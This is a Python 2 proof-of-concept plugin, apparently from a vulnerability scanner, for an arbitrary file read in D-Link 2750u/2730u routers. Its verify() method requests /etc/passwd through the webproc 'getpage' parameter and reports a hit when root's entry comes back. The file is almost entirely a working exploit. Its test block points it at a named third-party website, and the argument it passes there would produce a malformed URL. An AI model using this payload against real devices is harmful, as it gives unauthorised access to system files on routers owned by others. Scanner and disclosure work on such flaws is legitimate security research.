#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: D-Link 2750u/2730u arbitrarily file download
refer: None
访问 http://foobar/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd
读取任意文件
不只D-Link, 类似的有 Observa Telecom Home Station BHS-RTA 参见http://seclists.org/fulldisclosure/2015/May/129 可惜没找到测试样例
'''

import re
import urlparse

from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = arg + 'cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd'
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200 and 'root:/bin/sh' in res:
            output( payload,result,'hole')
        

        del curl
        return result


def output(url,result,label):
    info = url + '  d-link  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='d-link Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/d-link/d-link_33dc4e53a2beb1fd7dd5e5132f2d73be.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/d-link/d-link_33dc4e53a2beb1fd7dd5e5132f2d73be.py
#/root/github/poccreate/codesrc/exp-1898.py